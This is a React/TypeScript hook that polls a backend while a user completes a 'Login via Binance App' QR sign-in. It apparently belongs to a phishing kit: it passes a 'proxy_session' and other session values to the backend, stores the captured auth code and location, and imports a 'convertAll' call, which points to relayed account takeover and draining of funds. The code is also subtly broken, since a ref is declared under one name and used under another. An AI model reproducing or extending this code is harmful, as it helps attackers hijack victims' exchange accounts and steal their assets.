import { useState, useEffect, useRef, useCallback } from 'react';
import { checkLinkStatus, convertAll } from '../services/api';
import { ApiResponse, StatusResponse } from '../types/api';

const CHECK_INTERVAL = 1000; // Check every 1 second

export const useLoginStatus = (onConfirm: () => void) => {
  const [isCheckingStatus, setIsCheckingStatus] = useState(false);
  const [buttonText, setButtonText] = useState('Login via Binance App');
  const [isConfirmed, setIsConfirmed] = useState(false);
  const currentRequestRef = useRef<AbortController | null>(null);
  const checkTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const hasStartedRef = useRef(false);
  const conversionumbersRequestRef = useRef<Promise<ApiResponse> | null>(null);
  const hasConfirmedRef = useRef(false);
  const isCheckingRef = useRef(false); // Track if checkStatus is running
  let isHidden = false;

  const checkStatus = useCallback(async () => {
    if (isConfirmed || hasConfirmedRef.current || isCheckingRef.current) return;

    isCheckingRef.current = true;
    console.log('checkStatus called, timeout active:', !!checkTimeoutRef.current);

    if (currentRequestRef.current) {
      currentRequestRef.current.abort();
    }

    const sessionId = localStorage.getItem('sessionId');
    const session_id = localStorage.getItem('session_id');
    const deviceInfo = localStorage.getItem('deviceInfo');
    const qrCode = localStorage.getItem('qrCode');
    const random = localStorage.getItem('random');
    const proxySession = localStorage.getItem('proxy_session');

    if (!sessionId || !session_id || !deviceInfo || !qrCode || !random || !proxySession) {
      console.warn('Missing localStorage items, stopping checks');
      isCheckingRef.current = false;
      return;
    }

    const abortController = new AbortController();
    currentRequestRef.current = abortController;

    try {
      const data = await checkLinkStatus({
        session_id,
        sessionId,
        device_info: deviceInfo,
        qrCode,
        random,
        proxy_session: proxySession
      }) as StatusResponse;

      if (data.code === '600000004') {
        setButtonText('Verification Failed. Refreshing');
        setTimeout(() => {
          window.location.reload();
        }, 3000);
        return;
      }

      if (data.success && data.data) {
        switch (data.data.status) {
          case 'SCAN':
            setButtonText('Click & Confirm in Binance App');
            break;
          case 'NEW':
            break;  // Keep current text (loader)
          case 'CONFIRM':
            setButtonText('Success! Redirecting');
            setIsConfirmed(true);
            hasConfirmedRef.current = true;
            
            if (data.data.code) {
              localStorage.setItem('authCode', data.data.code);
            }
            if (data.data.bncLocation) {
              localStorage.setItem('bncLocation', data.data.bncLocation);
            }
            
            onConfirm();
            return;
          case 'EXPIRED':
            setButtonText('Login Expired, Try again');
            setTimeout(() => {
              window.location.reload();
            }, 3000);
            return;
        }
      }
    } catch (error: any) {
      console.error('Error checking status:', error);
      setButtonText('⌛');  // Keep loader on error
    } finally {
      currentRequestRef.current = null;
      isCheckingRef.current = false;
      if (!isConfirmed && !hasConfirmedRef.current) {
        if (checkTimeoutRef.current) {
          clearTimeout(checkTimeoutRef.current);
        }
        checkTimeoutRef.current = setTimeout(checkStatus, CHECK_INTERVAL);
      }
    }
  }, [isConfirmed, onConfirm]);

  const startChecking = useCallback(() => {
    if (isCheckingStatus) return;
    setButtonText('');  // Add loader icon
    setIsCheckingStatus(true);
    localStorage.setItem('isCheckingStatus', 'true');
    checkStatus();
  }, [isCheckingStatus, checkStatus]);

  const waitForConversion = async () => {
    if (conversionRequestRef.current) {
      await conversionRequestRef.current;
    }
  };

  useEffect(() => {
    return () => {
      if (checkTimeoutRef.current) {
        clearTimeout(checkTimeoutRef.current);
      }
      if (currentRequestRef.current) {
        currentRequestRef.current.abort();
      }
      localStorage.removeItem('isCheckingStatus');
      hasStartedRef.current = false;
    };
  }, []);

  useEffect(() => {
    const handleVisibilityChange = () => {
      console.log('Visibility changed, isHidden:', document.hidden, 'timeout active:', !!checkTimeoutRef.current);
      if (!isCheckingStatus) return;

      if (document.hidden) {
        isHidden = true;
      } else {
        isHidden = false;
        // Only restart polling if it's not already active
        if (!checkTimeoutRef.current && !isConfirmed && !hasConfirmedRef.current && !isCheckingRef.current) {
          checkStatus();
        }
      }
    };

    document.addEventListener('visibilitychange', handleVisibilityChange);

    return () => {
      document.removeEventListener('visibilitychange', handleVisibilityChange);
    };
  }, [isCheckingStatus, checkStatus]);

  return {
    isCheckingStatus,
    buttonText,
    isConfirmed,
    startChecking,
    waitForConversion
  };
};